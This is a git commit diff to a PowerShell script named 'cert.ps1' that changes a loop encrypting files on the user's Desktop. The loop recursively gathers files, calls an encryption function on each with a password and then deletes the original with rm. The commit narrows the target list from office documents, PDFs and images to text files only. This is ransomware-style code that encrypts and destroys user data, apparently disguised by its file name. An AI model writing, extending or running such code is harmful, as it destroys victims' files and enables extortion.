8eb4338932c4670c66cfcd89bd517041d16b7072
mimowR <83735226+mimowR@users.noreply.github.com>
2021-05-18 09:46:11 -0500

    Update cert.ps1

--- cert.ps1
+++ cert.ps1
@@ -398,7 +398,7 @@ Function Encr{param([string]$i,[string]$p)
 
 #foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
 # Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
-foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt, *.doc, *.docx, *.xls, *.xlsx, *.ppt, *.pptx, *.pdf, *.jpg  | ForEach-Object { $_.FullName })){ 
+foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt | ForEach-Object { $_.FullName })){ 
   Write-Host "Se manda llamar a la función de CIFRADO para el archivo: $i" -ForegroundColor Green
   Encr -i $i -p $pwd
   rm $i
